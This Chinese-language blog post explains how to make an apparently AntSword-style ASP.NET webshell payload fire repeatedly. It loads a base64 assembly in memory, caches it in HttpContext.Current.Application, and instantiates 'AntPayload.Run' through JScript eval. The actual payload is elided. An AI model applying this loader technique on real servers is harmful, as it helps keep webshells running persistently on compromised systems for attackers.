在Web项目中新建 `base.aspx` 页面时，遇到以下问题：

### 问题描述
- **第一次请求**：可以正常调用。
- **第二次请求**：出现类型转换错误：
  ```
  [A]AntPayload.Run 无法强制转换为 [B]AntPayload.Run。类型 A 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。类型 B 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。
  ```

### 初步尝试
- **检查重复加载**：通过添加判断，如果当前存在 `AntPayload.Run` 类型的 assembly，则不重复加载。
- **测试代码**：在 `test0.aspx` 中进行测试。
- **Type.GetType**：发现 `Type.GetType` 始终返回 `undefined`。
- **其他尝试**：使用 `System.Reflection.Assembly.GetCallingAssembly().GetType` 和 `System.Reflection.Assembly.GetExecutingAssembly().GetType` 也无效。
- **eval 问题**：直接在 JScript 中写代码可以多次稳定触发，但通过 `eval` 执行时仍然报错。

### 发现的问题
- **JScript 直接执行 vs eval**：
  - 直接写在 JScript 文件中：
    ```javascript
    var obj = System.Activator.CreateInstance(type);
    obj.Equals("");
    ```
  - 通过 `eval` 传递代码：
    ```javascript
    var assembly = System.Reflection.Assembly.GetExecutingAssembly();
    var obj = assembly.CreateInstance("AntPayload.Run");
    obj.Equals("");
    ```

### 解决方案
- **查找资料**：找到一篇2012年的博客，提到两次加载的 assembly 被加载到不同的上下文中，因此被视为不同的类，无法进行类型转换。
- **解决方案**：与北辰师傅讨论后，决定将第一次加载后的 assembly 引用存储在 `HttpContext.Current.Application` 中，然后通过 `Application.Get("ant")` 获取引用，再进行反射和实例化。

#### 修改后的 Payload 代码
```csharp
var Payload = "xxxxx";
HttpContext.Current.Application.Add("ant", System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)));
```

#### 通过 eval 执行
```javascript
eval('var obj = HttpContext.Current.Application.Get("ant").CreateInstance("AntPayload.Run"); obj.Equals("");');
```

### 结论
通过将 assembly 引用存储在 `HttpContext.Current.Application` 中，解决了上下文不同导致的类型转换问题，使得 payload 可以多次稳定触发。

特别感谢北辰师傅的交流探讨！

### 备注
初学 .NET，若有理解不当之处，请指正，以免误导他人。